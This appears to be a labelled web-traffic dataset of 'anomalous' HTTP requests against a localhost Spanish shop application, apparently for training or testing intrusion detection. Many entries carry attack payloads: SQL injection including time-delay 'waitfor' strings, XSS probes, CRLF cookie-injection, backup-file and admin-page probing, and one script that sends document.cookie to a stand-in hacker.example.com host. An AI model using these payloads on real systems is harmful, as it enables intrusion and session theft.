POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=suh9&pwdA=4ar9ues4a&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide.gif/.BAK,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6714&B1=ConfirmarAND+1%3D1,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=6714&B1=ConfirmarAND+1%3D1,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6714&B1=Pasar+por+caja%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=6714&B1=Pasar+por+caja%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=6714&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=6714&B1=Confirmar,anomalous
GET,http://localhost:8080/iisadmpwd/aexp.htr,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mombourq&password=decusada&nombre=Edurne&apellidos=Charbonnier+Sisneros&email=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=AlboxAND+1%3D1&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=mombourq&password=decusada&nombre=Edurne&apellidos=Charbonnier+Sisneros&email=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=AlboxAND+1%3D1&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mombourq&password=AND+1%3D1&nombre=Edurne&apellidos=Charbonnier+Sisneros&email=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=mombourq&password=AND+1%3D1&nombre=Edurne&apellidos=Charbonnier+Sisneros&email=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mombourq&password=decusada&nombre=Vi*n%2Ck*a&apellidos=Charbonnier+Sisneros&email=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=mombourq&password=decusada&nombre=Vi*n%2Ck*a&apellidos=Charbonnier+Sisneros&email=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mombourq&password=decusada&nombre=Edurne&apellidos=Charbonnier+Sisneros&emailA=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=mombourq&password=decusada&nombre=Edurne&apellidos=Charbonnier+Sisneros&emailA=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/bookmarks.nsf,,anomalous
GET,http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/samples/isapi/isapi.htm,,anomalous
GET,http://localhost:8080.BAK,,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=derenzo&password=estarcido&nombre=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derenzo&password=estarcido&nombre=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V%27INJECTED_PARAM&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=derenzo&password=estarcido&nombre=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V%27INJECTED_PARAM&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derenzo&password=4il%2C%2Bla&nombre=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=derenzo&password=4il%2C%2Bla&nombre=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derenzo&password=estarcido&nombreA=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=derenzo&password=estarcido&nombreA=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.Inc,,anomalous
GET,http://localhost:8080/asf-logo-wide.gif/.bak,,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730.BAK,,anomalous
GET,http://localhost:8080/6909030637832563290.jsp.Old,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=12&B1=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=12&B1=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=12&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=12&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=12&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=12&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%257C&login=mcnally&pwd=laCtesCente&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=%257C&login=mcnally&pwd=laCtesCente&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcnally&pwd=entr%2Conera%2Cr&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=mcnally&pwd=entr%2Conera%2Cr&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcnally&pwd=laCtesCente&rememberA=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=mcnally&pwd=laCtesCente&rememberA=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%4040,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%4040,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=8145&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=8145&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8145&B1=Pasar+por+caja%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8145&B1=Pasar+por+caja%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8145&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8145&B1A=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=salyer&password=a814Pe5l6do&nombre=Gary&apellidos=Echaves+Marrero&email=zabczynski%40touringa.dj&dniA=18665206Q&direccion=Balcon+De+Granada%2C+22+&ciudad=Cueva+de+%C1greda&cp=15957&provincia=Ja%E9n&ntc=9940406513389702&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=salyer&password=a814Pe5l6do&nombre=Gary&apellidos=Echaves+Marrero&email=zabczynski%40touringa.dj&dniA=18665206Q&direccion=Balcon+De+Granada%2C+22+&ciudad=Cueva+de+%C1greda&cp=15957&provincia=Ja%E9n&ntc=9940406513389702&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%257C,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%257C,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ramos&password=imperceptiblemenTE&nombre=Albana&apellidos=Giorgis+Zabala&email=mobley_bonn%40delujos.cv&dni=76097661E&direccion=Calle+12+56+&ciudad=Majaelrayo&cp=48220&provincia=Vizcaya&ntc=5189679108222832&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ramos&password=imperceptiblemenTE&nombre=Albana&apellidos=Giorgis+Zabala&email=mobley_bonn%40delujos.cv&dni=76097661E&direccion=Calle+12+56+&ciudad=Majaelrayo&cp=48220&provincia=Vizcaya&ntc=805212306238877&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ramos&password=imperceptiblemenTE&nombre=Albana&apellidos=Giorgis+Zabala&email=mobley_bonn%40delujos.cv&dni=76097661E&direccion=Calle+12+56+&ciudad=Majaelrayo&cp=48220&provincia=Vizcaya&ntc=805212306238877&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ramos&password=imperceptiblemenTE&nombre=Albana&apellidos=Giorgis+Zabala&email=mobley_bonn%40delujos.cv&dni=76097661E&direccionA=Calle+12+56+&ciudad=Majaelrayo&cp=48220&provincia=Vizcaya&ntc=5189679108222832&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ramos&password=imperceptiblemenTE&nombre=Albana&apellidos=Giorgis+Zabala&email=mobley_bonn%40delujos.cv&dni=76097661E&direccionA=Calle+12+56+&ciudad=Majaelrayo&cp=48220&provincia=Vizcaya&ntc=5189679108222832&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1.Old,,anomalous
GET,http://localhost:8080/examplesWebApp/WebservicesEJB.jsp,,anomalous
GET,http://localhost:8080/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9ricoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=100&cantidad=6&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9ricoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=100&cantidad=6&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=6&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=6&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidadA=6&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidadA=6&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=temp&pwd=tel7tipo%253F&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=temp&pwd=tel7tipo%253F&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=poi%2Cndex*t&pwd=tel7tipo&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=poi%2Cndex*t&pwd=tel7tipo&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=temp&pwd=tel7tipo&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&loginA=temp&pwd=tel7tipo&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=623&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=623&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=623&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=623&B1A=Confirmar,anomalous
GET,http://localhost:8080/CFIDE/administrator/login.cfm,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=emiline&password=despLataci%F3n&nombre=Helvecia&apellidos=Santini+Iennaco&email=mello%40supercover.so&dni=00041295X&direccion=Plza.+Q*uijan**o+S%2FN%2C+&ciudad=Megina&cp=10392&provincia=%C1vila&ntc=6829441346595733&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=emiline&password=despLataci%F3n&nombre=Helvecia&apellidos=Santini+Iennaco&email=mello%40supercover.so&dni=00041295X&direccion=Plza.+Q*uijan**o+S%2FN%2C+&ciudad=Megina&cp=10392&provincia=%C1vila&ntc=6829441346595733&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=emiline&password=despLataci%F3n&nombreA=Helvecia&apellidos=Santini+Iennaco&email=mello%40supercover.so&dni=00041295X&direccion=Plaza+Republica+Argentina%2C+147%2C+9F&ciudad=Megina&cp=10392&provincia=%C1vila&ntc=6829441346595733&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=emiline&password=despLataci%F3n&nombreA=Helvecia&apellidos=Santini+Iennaco&email=mello%40supercover.so&dni=00041295X&direccion=Plaza+Republica+Argentina%2C+147%2C+9F&ciudad=Megina&cp=10392&provincia=%C1vila&ntc=6829441346595733&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27OR%27a%3D%27a,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27OR%27a%3D%27a,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp.old,,anomalous
GET,http://localhost:8080/CFIDE/administrator/welcomeexapps.cfm,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1.old,,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=siomalas&password=s18i7re&nombre=Idalina&apellidos=Carcanoux&email=fujioka%40importaproductosespa%F1oles.in&dni=06317568C&direccion=Victor+Zurita+Soler%2C+8+9%3FB&ciudad=Puebla+de+Cazalla%2C+La&cp=49220&provincia=Ja%E9n&ntc=8222633485152757&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=siomalas&password=s18i7re&nombre=Idalina&apellidos=Carcanoux&email=fujioka%40importaproductosespa%F1oles.in&dni=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&direccion=Victor+Zurita+Soler%2C+8+9%3FB&ciudad=Puebla+de+Cazalla%2C+La&cp=49220&provincia=Ja%E9n&ntc=8222633485152757&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=siomalas&password=s18i7re&nombre=Idalina&apellidos=Carcanoux&email=fujioka%40importaproductosespa%F1oles.in&dni=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&direccion=Victor+Zurita+Soler%2C+8+9%3FB&ciudad=Puebla+de+Cazalla%2C+La&cp=49220&provincia=Ja%E9n&ntc=8222633485152757&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=que%27rida&password=s18i7re&nombre=Idalina&apellidos=Carcanoux&email=fujioka%40importaproductosespa%F1oles.in&dni=06317568C&direccion=Victor+Zurita+Soler%2C+8+9%3FB&ciudad=Puebla+de+Cazalla%2C+La&cp=49220&provincia=Ja%E9n&ntc=8222633485152757&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=que%27rida&password=s18i7re&nombre=Idalina&apellidos=Carcanoux&email=fujioka%40importaproductosespa%F1oles.in&dni=06317568C&direccion=Victor+Zurita+Soler%2C+8+9%3FB&ciudad=Puebla+de+Cazalla%2C+La&cp=49220&provincia=Ja%E9n&ntc=8222633485152757&B1=Registrar,anomalous
